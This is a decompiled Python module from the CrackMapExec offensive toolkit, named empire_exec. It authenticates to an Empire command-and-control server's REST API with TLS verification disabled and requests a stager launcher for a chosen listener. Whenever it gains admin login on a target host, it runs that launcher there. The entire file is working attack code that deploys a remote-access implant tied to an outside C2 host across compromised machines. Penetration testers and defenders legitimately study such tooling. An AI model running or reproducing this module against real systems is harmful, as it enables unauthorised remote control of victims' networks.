# uncompyle6 version 3.6.7
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.8.2 (tags/v3.8.2:7b3ab59, Feb 25 2020, 23:03:10) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: /home/byt3bl33d3r/.virtualenvs/CME_old/lib/python2.7/site-packages/cme/modules/empire_exec.py
# Compiled at: 2016-12-29 01:51:56
import sys, requests
from requests import ConnectionError
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class CMEModule:
    """
        Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
        Module by @byt3bl33d3r
    """
    name = 'empire_exec'
    description = "Uses Empire's RESTful API to generate a launcher for the specified listener and executes it"

    def options(self, context, module_options):
        """
            LISTENER    Listener name to generate the launcher for
        """
        if 'LISTENER' not in module_options:
            context.log.error('LISTENER option is required!')
            sys.exit(1)
        self.empire_launcher = None
        headers = {'Content-Type': 'application/json'}
        payload = {'username': context.conf.get('Empire', 'username'), 'password': context.conf.get('Empire', 'password')}
        base_url = ('https://{}:{}').format(context.conf.get('Empire', 'api_host'), context.conf.get('Empire', 'api_port'))
        try:
            r = requests.post(base_url + '/api/admin/login', json=payload, headers=headers, verify=False)
            if r.status_code == 200:
                token = r.json()['token']
                payload = {'StagerName': 'launcher', 'Listener': module_options['LISTENER']}
                r = requests.post(base_url + ('/api/stagers?token={}').format(token), json=payload, headers=headers, verify=False)
                self.empire_launcher = r.json()['launcher']['Output']
                context.log.success(("Successfully generated launcher for listener '{}'").format(module_options['LISTENER']))
            else:
                context.log.error("Error authenticating to Empire's RESTful API server!")
                sys.exit(1)
        except ConnectionError as e:
            context.log.error(("Unable to connect to Empire's RESTful API: {}").format(e))
            sys.exit(1)

        return

    def on_admin_login(self, context, connection):
        if self.empire_launcher:
            connection.execute(self.empire_launcher)
            context.log.success('Executed Empire Launcher')